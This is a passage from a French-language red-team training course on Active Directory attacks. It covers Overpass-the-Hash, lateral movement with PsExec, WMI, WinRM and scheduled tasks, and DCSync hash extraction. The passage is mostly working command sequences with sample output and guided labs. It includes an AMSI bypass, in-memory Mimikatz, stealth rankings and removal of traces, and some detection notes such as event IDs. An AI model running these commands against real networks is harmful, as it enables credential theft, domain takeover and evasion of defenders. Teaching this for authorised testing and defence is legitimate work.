| `/rc4:HASH` | Hash NTLM (RC4-HMAC) pour l'authentification AS-REQ |
| `/aes256:KEY` | Clé AES256 pour l'authentification AS-REQ (alternative à RC4) |
| `/ptt` | Injecte le TGT dans le cache Kerberos immédiatement (Pass-The-Ticket automatique) |
| `/nowrap` | Affiche le ticket en base64 sans l'injecter (pour transfert/sauvegarde) |
| `/domain:DOMAIN` | Spécifie le domaine (si auto-détection échoue) |

**Sortie typique :**

```
  v2.2.0

[*] Action: Ask TGT

[*] Using domain controller: DC01.corp.local (10.0.1.10)
[+] TGT request successful!
[*] base64(ticket.kirbi):
doICkDCCAo2gAwIBBaEDAgEWooI...
[+] Ticket successfully injected!
```

**Vérification :**
```powershell
# Liste les tickets dans le cache pour confirmer que le TGT est injecté
klist
# Test d'accès SMB au DC via le TGT injecté
# Si l'accès est refusé, le TGT n'est pas valide ou l'utilisateur n'a pas les droits
dir \\DC01\C$
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `klist` | Affiche le cache Kerberos (vérifie la présence du TGT) |
| `dir \\DC01\C$` | Test d'accès ADMIN$ au DC (confirme que le TGT permet l'authentification) |

### 5.3 Impacket : getTGT.py

Depuis Linux, **getTGT.py** (impacket) permet de demander un TGT avec un hash :

```bash
# Demande un TGT au KDC en utilisant le hash NTLM RC4
# Crée un fichier .ccache dans le dossier courant
# Format : impacket-getTGT <DOMAINE>/<USER> -hashes :<HASH>
impacket-getTGT corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c

# Le fichier Administrator.ccache est créé dans le dossier courant
# (contenant le TGT au format MIT Credential Cache)
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-getTGT DOMAIN/USER -hashes :HASH` | Demande un TGT au KDC en s'authentifiant avec le hash NTLM. Produit un fichier `USER.ccache` dans le dossier courant |
| `-hashes :HASH` | Format du hash NTLM (LM vide, NTLM = HASH) |

#### Utilisation du TGT avec impacket

```bash
# Définit la variable KRB5CCNAME pour pointer vers le TGT fraîchement créé
# Tous les outils impacket avec l'option -k utiliseront ce ticket
export KRB5CCNAME=/path/to/Administrator.ccache

# Connexion SMB à FILESERVER en utilisant le ticket Kerberos
# -k : authentification Kerberos (au lieu de NTLM)
# -no-pass : pas de mot de passe (utilise le ticket dans KRB5CCNAME)
impacket-smbexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local

# Connexion WMI à DC01 avec le ticket Kerberos
# WMI supporte l'authentification Kerberos via SPNEGO
impacket-wmiexec -k -no-pass corp.local/Administrator@DC01.corp.local

# Connexion WinRM avec le ticket (contournement de la limitation PtH !)
# WinRM n'accepte PAS le PtH direct mais accepte Kerberos
# Note : nécessite python3-pywinrm pour la couche WinRM
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `export KRB5CCNAME=/chemin/vers/USER.ccache` | Pointe la variable d'environnement vers le cache Kerberos contenant le TGT |
| `impacket-smbexec -k -no-pass DOMAIN/USER@HOST` | Connexion SMB via Kerberos. `-k` active le mode Kerberos, `-no-pass` utilise le ticket |
| `impacket-wmiexec -k -no-pass DOMAIN/USER@HOST` | Connexion WMI via Kerberos (mêmes options) |
| `-k` | Utilise l'authentification Kerberos (lit KRB5CCNAME) |
| `-no-pass` | N'envoie pas de mot de passe (le ticket suffit) |

**Pourquoi le ticket Kerberos contourne-t-il la limitation WinRM ?**

WinRM accepte l'authentification Kerberos (négociation SPNEGO) par défaut. Avec un TGT valide, l'attaquant peut obtenir un TGS pour les services HTTP/WinRM et s'authentifier via Kerberos au lieu de NTLM.

### 5.4 TP Guidé : From Hash to TGT to Shell

#### Objectif

À partir d'un hash NTLM, obtenir un shell interactif via WinRM (qui n'accepte pas le PtH direct) en passant par Overpass-the-Hash.

#### Scénario

```
Hash NTLM ──> getTGT.py ──> TGT.ccache ──> export KRB5CCNAME ──> evil-winrm (Kerberos)
```

#### Étape 1 : Obtenir le TGT depuis Linux

```bash
# Demande un TGT Kerberos au DC en utilisant le hash NTLM
# Le résultat est un fichier Administrator.ccache
impacket-getTGT corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c
# Vérifie que le fichier .ccache a bien été créé avec ses permissions
ls -la Administrator.ccache
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-getTGT corp.local/Administrator -hashes :8846...` | Obtenir un TGT (format .ccache) depuis un hash NTLM |
| `ls -la Administrator.ccache` | Vérifie la présence et la taille du fichier de ticket |

#### Étape 2 : Configurer Kerberos

```bash
# Affiche le contenu du fichier de configuration Kerberos
# Ce fichier définit le realm, les KDC, et les options de tickets
# Nécessaire pour que les outils Kerberos sachent quel DC contacter
cat /etc/krb5.conf
```

**Contenu de `/etc/krb5.conf` :**

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false

[realms]
    CORP.LOCAL = {
        kdc = DC01.corp.local
        admin_server = DC01.corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

```bash
# Définit la variable d'environnement pointant vers le TGT
# Doit être faite dans le même terminal que les commandes suivantes
export KRB5CCNAME=/path/to/Administrator.ccache
# Vérifie que le ticket est chargé et affiche ses propriétés
# (utilisateur, validité, type de chiffrement)
klist
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `export KRB5CCNAME=/path/to/Administrator.ccache` | Définit le chemin du cache Kerberos pour les outils en ligne de commande |
| `klist` | Affiche les tickets dans le cache (vérification que le TGT est valide) |

#### Étape 3 : Shell avec evil-winrm (Kerberos)

```bash
# Installation d'evil-winrm (outil Ruby pour WinRM)
# gem = gestionnaire de paquets Ruby
sudo gem install evil-winrm
# Connexion WinRM à FILESERVER en utilisant l'authentification Kerberos
# -i : hostname (FQDN requis pour Kerberos)
# -k : utilise l'authentification Kerberos (lit KRB5CCNAME)
evil-winrm -i FILESERVER.corp.local -k
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `sudo gem install evil-winrm` | Installe evil-winrm via RubyGems (nécessite Ruby) |
| `evil-winrm -i FILESERVER.corp.local -k` | Connexion WinRM avec Kerberos. `-i` = cible (FQDN obligatoire pour Kerberos), `-k` = mode Kerberos (utilise le ticket dans KRB5CCNAME) |

**Dans le shell :**
```
*Evil-WinRM* PS C:\> whoami
corp\administrator
*Evil-WinRM* PS C:\> hostname
FILESERVER
```

#### Étape 4 : Alternative avec impacket

```bash
# Connexion WMI à FILESERVER en utilisant le TGT Kerberos (sans mot de passe)
impacket-wmiexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local
# Connexion SMB à FILESERVER en utilisant le TGT Kerberos (sans mot de passe)
impacket-smbexec -k -no-pass corp.local/Administrator@FILESERVER.corp.local
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-wmiexec -k -no-pass DOMAIN/USER@HOST` | Shell WMI via Kerberos |
| `impacket-smbexec -k -no-pass DOMAIN/USER@HOST` | Shell SMB via Kerberos |
| `-k` | Mode Kerberos |
| `-no-pass` | Pas de mot de passe (utilise le ticket KRB5CCNAME) |

#### Étape 5 : Vérification des logs sur le DC

Sur le contrôleur de domaine (DC01), vérifier les événements générés :

```
Event ID 4768 — Un TGT a été demandé (AS-REQ)
  - Compte : Administrator
  - Type de chiffrement : RC4-HMAC (0x17)
```

> **Note OPSEC :** Le type de chiffrement RC4-HMAC dans un environnement qui utilise normalement AES256 est un indicateur de compromission pour les SOC avancés.

---

## 6. Mouvement latéral : PsExec, WMI, WinRM, Schtasks

### 6.1 Vue d'ensemble

| Outil | Protocole | Port | Mécanisme | Discrétion |
|---|---|---|---|---|
| **PsExec** (SysInternals) | SMB | 445 | Service SMB | Faible |
| **impacket-psexec** | SMB | 445 | Service SMB | Faible |
| **wmiexec.py** | WMI/DCOM | 135, 49152+ | Win32_Process.Create | Moyenne |
| **impacket-wmiexec** | WMI/DCOM | 135, 49152+ | Win32_Process.Create | Moyenne |
| **evil-winrm** | WinRM (HTTP/S) | 5985/5986 | PowerShell Remoting | Haute |
| **WinRM native** | WinRM | 5985/5986 | WS-Management | Haute |
| **impacket-smbexec** | SMB | 445 | Scheduled Task | Faible |
| **schtasks** | SMB/RPC | 445/135 | Tâche planifiée | Moyenne |

**Comparaison des EventIDs :**

| Outil | EventID | Description |
|---|---|---|
| **PsExec** | 4697 | Création de service |
| **PsExec** | 7045 | Service installé (System) |
| **WMI** | 4688 | Création de processus cmd.exe |
| **WMI** | 5861 | WMI-Activity (log WMI) |
| **WinRM** | 53504 | PowerShell Named Pipe |
| **WinRM** | 168 | WSMan Session |
| **schtasks** | 4698 | Tâche planifiée créée |
| **schtasks** | 106 | Tâche planifiée démarrée |

### 6.2 PsExec

#### Version SysInternals (Windows)

```powershell
# Exécute cmd.exe sur FILESERVER avec les credentials de l'Administrateur
# \\FILESERVER : machine cible (chemin UNC)
# -u : utilisateur, -p : mot de passe en clair
psexec.exe \\FILESERVER -u CORP\Administrator -p MonMDP cmd.exe

# Exécute cmd.exe en tant que SYSTEM (plus haut privilège)
# -s : le processus distant tourne sous NT AUTHORITY\SYSTEM
# Utile si le contexte Administrateur ne suffit pas
psexec.exe \\FILESERVER -s cmd.exe

# Copie mimikatz.exe sur la cible puis l'exécute
# -c : copie le fichier local sur la cible avant exécution
psexec.exe \\FILESERVER -u CORP\Administrator -p MonMDP -c mimikatz.exe

# Mode interactif (affiche l'interface graphique distante)
# -i : permet l'interaction avec le bureau de la cible
psexec.exe \\FILESERVER -u CORP\Administrator -p MonMDP -i cmd.exe
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `psexec.exe` | Outil SysInternals Microsoft pour exécution de commandes à distance. Fonctionnement : upload du service PSEXESVC puis connexion via pipe |
| `\\FILESERVER` | Nom ou IP de la machine cible (format UNC) |
| `-u USER` | Nom d'utilisateur pour l'authentification |
| `-p PASSWORD` | Mot de passe en clair pour l'authentification |
| `-s` | Exécute le processus distant sous SYSTEM (privilège maximal) |
| `-c FICHIER` | Copie le fichier spécifié sur la cible avant de l'exécuter |
| `-i` | Mode interactif : permet d'interagir avec le bureau distant |
| `cmd.exe` | Programme à exécuter sur la cible |

#### impacket-psexec (Linux)

```bash
# Shell interactif sur FILESERVER avec hash NTLM (PtH)
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@FILESERVER.corp.local

# Avec un profil Windows spécifique
# -profile WIN10 : adapte le binaire uploadé à Windows 10 (meilleure compatibilité)
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c -profile WIN10 corp.local/Administrator@10.0.1.50

# Utilise un binaire personnalisé pour le service distant
# -custom-binary powershell.exe : upload PowerShell au lieu de cmd.exe
# Utile pour avoir un shell PowerShell directement
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c -custom-binary powershell.exe corp.local/Administrator@10.0.1.50
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-psexec` | Implémentation Python du PsExec (fait partie de la suite Impacket) |
| `-hashes :HASH` | Authentification par hash NTLM (format : `LM:NTLM`) |
| `-profile WIN10` | Spécifie le profil Windows cible pour le binaire uploadé (WIN10, WIN8, WIN7, etc.) |
| `-custom-binary powershell.exe` | Remplace le binaire par défaut (cmd.exe) par PowerShell pour le shell distant |

#### Fonctionnement technique de PsExec

1. PsExec se connecte à ADMIN$ via SMB
2. Upload du binaire PSEXESVC.exe dans ADMIN$
3. Création d'un service Windows via SC Manager
4. Le service démarre et crée un pipe nommé
5. Le client se connecte au pipe
6. Les commandes sont transmises via le pipe
7. La sortie est retournée via le pipe

### 6.3 WMI

#### impacket-wmiexec

```bash
# Shell interactif via WMI (Windows Management Instrumentation)
# Utilise le protocole DCOM (port 135) pour communiquer
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50

# Mode verbose : affiche des informations de débogage supplémentaires
# -v : active le mode verbose (utile pour diagnostiquer les erreurs)
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c -v corp.local/Administrator@10.0.1.50
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-wmiexec` | Outil d'exécution de commandes à distance via WMI (utilisation de `Win32_Process.Create`) |
| `-v` | Mode verbose (affiche les appels WMI détaillés) |

#### wmic (Windows natif)

```cmd
# Exécution d'une commande sur FILESERVER via WMI native (sans outil externe)
# /node : nom ou IP de la machine cible
# /user : compte pour l'authentification
# /password : mot de passe (en clair)
# process call create : méthode WMI pour créer un processus distant
# La commande exécute whoami et redirige la sortie vers un fichier texte
wmic /node:FILESERVER /user:CORP\Administrator /password:MonMDP process call create "cmd.exe /c whoami > C:\Windows\Temp\output.txt"
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `wmic` | Windows Management Instrumentation Command-line (outil natif Windows) |
| `/node:FILESERVER` | Machine cible (nom NetBIOS ou IP) |
| `/user:USER` | Compte pour l'authentification distante |
| `/password:PASS` | Mot de passe en clair |
| `process call create "..."` | Appelle la méthode `Create` de la classe `Win32_Process` pour lancer un processus sur la cible |

### 6.4 WinRM

#### evil-winrm

```bash
# Installation d'evil-winrm (outil Ruby pour WinRM/PowerShell Remoting)
sudo gem install evil-winrm

# Connexion avec mot de passe en clair
# -i : adresse IP ou hostname de la cible
# -u : nom d'utilisateur
# -p : mot de passe en clair
evil-winrm -i 10.0.1.50 -u Administrator -p 'MonMDP'

# Connexion avec ticket Kerberos (après Overpass-the-Hash)
# -i : FQDN obligatoire pour Kerberos (pas d'IP)
# -k : utilise l'authentification Kerberos (lit KRB5CCNAME)
evil-winrm -i FILESERVER.corp.local -u Administrator -k

# Depuis le shell evil-winrm : upload d'un fichier vers la cible
# upload <source_locale> <destination_distant>
*Evil-WinRM* PS C:\> upload mimikatz.exe C:\Windows\Temp\mimikatz.exe

# Depuis le shell evil-winrm : download d'un fichier depuis la cible
# download <source_distant> <destination_locale>
*Evil-WinRM* PS C:\> download C:\Windows\Temp\result.txt result.txt

# Bypass-4MSI : contourne la protection AMSI (Anti-Malware Scan Interface)
# Permet de charger des outils PowerShell malveillants sans être bloqué
*Evil-WinRM* PS C:\> Bypass-4MSI
# Invoke-Mimikatz : charge et exécute Mimikatz en mémoire (sans fichier disque)
*Evil-WinRM* PS C:\> Invoke-Mimikatz
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `sudo gem install evil-winrm` | Installe evil-winrm via RubyGems |
| `evil-winrm -i IP -u USER -p PASS` | Connexion WinRM avec mot de passe en clair |
| `evil-winrm -i FQDN -u USER -k` | Connexion WinRM avec ticket Kerberos (nécessite FQDN) |
| `-i` | Adresse IP ou FQDN de la cible (FQDN obligatoire pour Kerberos) |
| `-u` | Nom d'utilisateur |
| `-p` | Mot de passe en clair |
| `-k` | Mode Kerberos (utilise le ticket dans KRB5CCNAME) |
| `upload src dst` | Commande evil-winrm : transfère un fichier local vers la cible distante |
| `download src dst` | Commande evil-winrm : récupère un fichier distant vers la machine locale |
| `Bypass-4MSI` | Commande evil-winrm : contourne AMSI pour charger du code PowerShell non signé |
| `Invoke-Mimikatz` | Commande evil-winrm : charge Mimikatz en mémoire (technique de living-off-the-land) |

#### PowerShell New-PSSession

```powershell
# Convertit le mot de passe en clair en objet SecureString PowerShell
# -AsPlainText : indique que la chaîne est en clair (pas de conversion depuis un fichier)
# -Force : force l'utilisation d'une chaîne en clair (normalement interdite)
$pass = ConvertTo-SecureString 'MonMDP' -AsPlainText -Force

# Crée un objet PSCredential contenant le nom d'utilisateur et le mot de passe
# Format du compte : DOMAINE\Utilisateur
$cred = New-Object System.Management.Automation.PSCredential('CORP\Administrator', $pass)

# Crée une session PowerShell à distance (WinRM) vers FILESERVER
$session = New-PSSession -ComputerName FILESERVER.corp.local -Credential $cred
# Exécute une commande dans la session distante
# Invoke-Command : exécute le ScriptBlock { whoami } sur la session distante
Invoke-Command -Session $session -ScriptBlock { whoami }

# Ouvre un shell PowerShell interactif sur la machine distante
# Enter-PSSession : simule un SSH-like pour PowerShell
Enter-PSSession -ComputerName FILESERVER.corp.local -Credential $cred
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `ConvertTo-SecureString 'MDP' -AsPlainText -Force` | Convertit une chaîne en clair en objet SecureString (nécessaire pour PSCredential) |
| `New-Object PSCredential('USER', $pass)` | Crée un objet credential PowerShell (utilisateur + mot de passe) |
| `New-PSSession -ComputerName HOST -Credential $cred` | Établit une session PowerShell distante via WinRM |
| `Invoke-Command -Session $session -ScriptBlock { ... }` | Exécute un bloc de commandes PowerShell dans la session distante |
| `Enter-PSSession -ComputerName HOST -Credential $cred` | Ouvre un shell PowerShell interactif sur la cible (comme ssh) |

### 6.5 Scheduled Tasks

#### Via schtasks

```cmd
# Crée une tâche planifiée sur FILESERVER qui exécute whoami sous SYSTEM
# /CREATE : crée une nouvelle tâche
# /S : machine cible (FILESERVER)
# /U : utilisateur pour l'authentification
# /P : mot de passe pour l'authentification
# /TN "RedTeamUpdate" : nom de la tâche (doit sembler légitime)
# /TR : programme à exécuter (cmd.exe /c whoami > fichier)
# /SC ONCE : la tâche s'exécute une seule fois
# /ST 00:00 : heure de démarrage (minuit, immédiat)
# /RU SYSTEM : exécute la tâche sous le compte SYSTEM
schtasks /CREATE /S FILESERVER /U CORP\Administrator /P MonMDP `
    /TN "RedTeamUpdate" /TR "cmd.exe /c whoami > C:\Windows\Temp\schtask_out.txt" `
    /SC ONCE /ST 00:00 /RU SYSTEM

# Démarre immédiatement la tâche planifiée (sans attendre l'horaire)
# /RUN : exécute la tâche /TN spécifiée
schtasks /RUN /S FILESERVER /U CORP\Administrator /P MonMDP /TN "RedTeamUpdate"

# Supprime la tâche planifiée (efface les traces)
# /DELETE : supprime la tâche spécifiée
# /F : force la suppression sans confirmation
schtasks /DELETE /S FILESERVER /U CORP\Administrator /P MonMDP /TN "RedTeamUpdate" /F
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `schtasks /CREATE` | Crée une tâche planifiée sur le système local ou distant |
| `/S HOST` | Spécifie la machine cible (système distant) |
| `/U USER` | Nom d'utilisateur pour l'authentification distante |
| `/P PASS` | Mot de passe pour l'authentification distante |
| `/TN "NAME"` | Nom de la tâche (Task Name) |
| `/TR "CMD"` | Programme/commande à exécuter (Task Run) |
| `/SC ONCE` | Planification : la tâche s'exécute une seule fois |
| `/ST HH:MM` | Heure de démarrage de la tâche |
| `/RU SYSTEM` | Exécute la tâche sous NT AUTHORITY\SYSTEM (privilège maximal) |
| `schtasks /RUN /TN "NAME"` | Démarre la tâche immédiatement |
| `schtasks /DELETE /TN "NAME" /F` | Supprime la tâche (/F = force sans confirmation) |

#### Via impacket-smbexec (Linux)

```bash
# Shell interactif via SMB en utilisant une tâche planifiée
# impacket-smbexec utilise le Service Control Manager pour créer
# un service temporaire (similaire à PsExec mais sans upload de binaire)
# Le mécanisme : crée une tâche planifiée → exécute la commande → récupère la sortie
impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-smbexec` | Outil Impacket : exécution de commandes via SMB en créant des services Windows ou tâches planifiées. Fonctionnement : se connecte à ADMIN$, écrit un script batch temporaire, le planifie via schtasks, récupère la sortie |
| `-hashes :HASH` | Authentification par hash NTLM |

### 6.6 TP Guidé : 4 méthodes d'exécution distante

#### Objectif

Exécuter `whoami` sur `FILESERVER` via 4 méthodes différentes.

#### Étape 1 : Préparation

```bash
# Vérifie que le hash Administrateur fonctionne sur FILESERVER
# Confirme que la cible est accessible avant de lancer les tests
crackmapexec smb 10.0.1.50 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
# Définit la variable d'environnement pour le ticket Kerberos
# (nécessaire pour les méthodes utilisant Kerberos comme WinRM)
export KRB5CCNAME=/path/to/Administrator.ccache
```

#### Étape 2 : Méthode 1 — PsExec

```bash
# Affiche un en-tête pour identifier la méthode dans les résultats
echo "=== MÉTHODE 1 : PsExec ==="
# Exécution non-interactive de whoami via PsExec
# Le résultat est affiché dans la console
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50 whoami
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `echo "=== ... ==="` | Affiche un message de séparation dans le terminal |
| `impacket-psexec -hashes :HASH DOMAIN/USER@HOST whoami` | Exécute `whoami` sur la cible distante via PsExec. Mode non-interactif : la commande est exécutée et le résultat est retourné |

**Sortie :** `nt authority\system`

#### Étape 3 : Méthode 2 — WMI

```bash
echo "=== MÉTHODE 2 : WMI ==="
# Exécution non-interactive de whoami via WMI (plus discret que PsExec)
# Utilise Win32_Process.Create au lieu de créer un service
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50 whoami
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-wmiexec -hashes :HASH DOMAIN/USER@HOST whoami` | Exécute `whoami` sur la cible distante via WMI. Mécanisme : appelle la méthode `Create` de `Win32_Process` |

**Sortie :** `corp\administrator`

#### Étape 4 : Méthode 3 — WinRM

```bash
echo "=== MÉTHODE 3 : WinRM ==="
# Obtention d'un TGT Kerberos depuis le hash NTLM (Overpass-the-Hash)
impacket-getTGT corp.local/Administrator -hashes :8846f7eaee8fb117ad06bdd830b7586c
# Définit la variable d'environnement pour utiliser le TGT
export KRB5CCNAME=/path/to/Administrator.ccache
# Connexion WinRM avec authentification Kerberos
# -k : mode Kerberos (contourne la limitation PtH de WinRM)
evil-winrm -i FILESERVER.corp.local -u Administrator -k
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-getTGT` | Convertit le hash NTLM en TGT Kerberos (Overpass-the-Hash) |
| `export KRB5CCNAME=...` | Définit le chemin du cache Kerberos |
| `evil-winrm -i HOST -u USER -k` | Connexion WinRM avec Kerberos. `-k` = mode Kerberos (contourne la limitation PtH) |

**Sortie :** `corp\administrator`

#### Étape 5 : Méthode 4 — Scheduled Task

```bash
echo "=== MÉTHODE 4 : Scheduled Task ==="
# Shell interactif via SMB en créant une tâche planifiée
# Permet d'exécuter des commandes sous le contexte SYSTEM
impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@10.0.1.50
# Une fois dans le shell, exécute whoami (résultat : nt authority\system)
whoami
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `impacket-smbexec -hashes :HASH DOMAIN/USER@HOST` | Shell interactif via création de tâche planifiée SMB. Le processus tourne sous SYSTEM |
| `whoami` (dans le shell distant) | Affiche l'identité du processus distant |

**Sortie :** `nt authority\system`

#### Étape 6 : Comparaison des logs

```powershell
# Récupère les événements de sécurité du journal Windows
# Filtre sur les EventIDs caractéristiques des différentes méthodes :
# 4624 = Logon, 4697 = Création service, 4688 = Création processus,
# 7045 = Installation service, 4698 = Création tâche planifiée
# Affiche les résultats sous forme de tableau formaté
Get-WinEvent -LogName Security | Where-Object { $_.Id -in @(4624, 4697, 4688, 7045, 4698) } | Format-Table TimeCreated, Id, LevelDisplayName, Message -AutoSize -Wrap
```

**Explication des commandes :**

| Commande / Option | Rôle / Explication |
|---|---|
| `Get-WinEvent -LogName Security` | Récupère tous les événements du journal de sécurité Windows |
| `Where-Object { $_.Id -in @(4624, 4697, ...) }` | Filtre sur les EventIDs spécifiques. 4624 = connexion, 4697 = service créé, 4688 = processus créé, 7045 = service installé, 4698 = tâche créée |
| `Format-Table TimeCreated, Id, LevelDisplayName, Message -AutoSize -Wrap` | Affiche les résultats en tableau avec colonnes : date, EventID, niveau, message. `-AutoSize` ajuste la largeur, `-Wrap` gère le texte long |

**Tableau récapitulatif :**

| Méthode | EventIDs | Artefacts sur disque | Discrétion |
|---|---|---|---|
| **PsExec** | 4624, 4697, 7045 | Binaire uploadé + service créé | ★☆☆☆☆ |
| **WMI** | 4624, 4688, 5861 | Aucun (processus en mémoire) | ★★★☆☆ |
| **WinRM** | 4624, 53504, 168 | Logs PowerShell | ★★★★☆ |
| **Schtasks** | 4624, 4698, 106 | Tâche planifiée créée | ★★☆☆☆ |

---

## 7. DCSync (T1003.006)

### 7.1 Principe

Le **DCSync** est une technique qui permet à un attaquant de se faire passer pour un Contrôleur de Domaine (DC) et de demander la **réplication des données d'annuaire** via le protocole **MS-DRSR** (Directory Replication Service).

**Fonctionnement :**

```
┌────────────────┐                    ┌────────────────┐
│  Attaquant     │  MS-DRSR Request   │  DC Cible      │
│  (compte avec  │  ────────────────>  │  (ex: DC01)    │
│   droits de    │                    │                │
│   réplication) │  <────────────────  │                │
│                │  Réplication      │                │
│                │  (hashs NTLM,     │                │
│                │   clés Kerberos,  │                │
│                │   secrets LSA)    │                │
└────────────────┘                    └────────────────┘
```

**Pourquoi ça marche ?**

Le protocole MS-DRSR permet la réplication entre contrôleurs de domaine. Si un attaquant possède un compte avec les droits **"Replicating Directory Changes"** et **"Replicating Directory Changes All"**, il peut :

1. Demander la réplication des données de n'importe quel utilisateur
2. Obtenir le hash NTLM, le hash LM, les clés Kerberos
3. Extraire le hash du compte KRBTGT (pour créer des Golden Tickets)

**Droits requis :** (par défaut : Administrateurs du domaine, Contrôleurs de domaine, Enterprise Admins)

| Droite | Description |
|---|---|
| `DS-Replication-Get-Changes` (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) | Lire les changements de réplication |
| `DS-Replication-Get-Changes-All` (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) | Lire TOUS les changements de réplication |
| `DS-Replication-Get-Changes-In-Filtered-Set` (89e95b76-444d-4c62-991a-0facbeda640c) | Réplication filtrée |

### 7.2 Outils pour le DCSync

#### secretsdump.py (impacket)

```bash
# DCSync complet : extrait TOUS les hashs du domaine (NTDS.dit)
# -just-dc : utilise la méthode DRSUAPI pour répliquer la base NTDS
# Nécessite des droits de réplication Active Directory
impacket-secretsdump -just-dc corp.local/Administrator@DC01.corp.local

# DCSync avec authentification par hash NTLM (PtH + DCSync combinés)
# -hashes : spécifie le hash au lieu du mot de passe en clair
impacket-secretsdump -just-dc -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/Administrator@DC01.corp.local

# DCSync avec ticket Kerberos (après Overpass-the-Hash)
export KRB5CCNAME=/path/to/Administrator.ccache
impacket-secretsdump -k -no-pass corp.local/Administrator@DC01.corp.local

# Extraction uniquement des hashs NTLM (sans les clés Kerberos)
# Plus rapide que -just-dc car moins de données à traiter
impacket-secretsdump -just-dc-ntlm corp.local/Administrator@DC01.corp.local

# Extraction d'un utilisateur spécifique uniquement
# Utile pour cibler le hash d'un compte particulier (ex: krbtgt)
impacket-secretsdump -just-dc-user jdupont corp.local/Administrator@DC01.corp.local

# Extraction COMPLÈTE : NTDS.dit + SAM local + secrets LSA
# Sans -just-dc, secretsdump extrait aussi les hashs locaux du DC
impacket-secretsdump corp.local/Administrator@DC01.corp.local
```

**Paramètres importants :**

| Option | Description |
|---|---|
| `-just-dc` | Extrait uniquement le NTDS.dit (DCSync complet via DRSUAPI). Récupère : hashs NTLM, clés Kerberos, secrets |
| `-just-dc-ntlm` | Extrait uniquement les hashs NTLM (plus rapide, moins de données) |
| `-just-dc-user USER` | Extrait un utilisateur spécifique uniquement |
| `-hashes LM:NTLM` | Authentification par hash (PtH) |
| `-k` | Utiliser l'authentification Kerberos (depuis KRB5CCNAME) |
| `-no-pass` | Pas de mot de passe (utilise le ticket Kerberos) |
| `-user-status` | Affiche le statut des comptes (actif/désactivé) |

**Sortie typique :**

```
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e:::
jdupont:1103:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:::
svc_sql:1200:aad3b435b51404eeaad3b435b51404ee:8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c:::

[*] Kerberos keys extracted:
Administrator:aes256-cts-hmac-sha1-96:6b7a8f9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f
Administrator:aes128-cts-hmac-sha1-96:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d
Administrator:des-cbc-md5:0d1e2f3a4b5c6d7e

[*] Cleaning up...
```

#### Mimikatz lsadump::dcsync

```mimikatz
# DCSync de tous les utilisateurs du domaine
# /domain : nom du domaine cible
# /all : synchronise tous les comptes
# /csv : sortie au format CSV (facile à parser)
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# DCSync d'un utilisateur spécifique (Administrator)
# Plus discret que /all car ne génère qu'une seule requête de réplication
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# DCSync du compte KRBTGT (crucial pour Golden Ticket)
# Le hash du KRBTGT permet de forger des TGT pour n'importe quel utilisateur
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# DCSync avec sortie formatée CSV (prêt pour import ou hashcat)
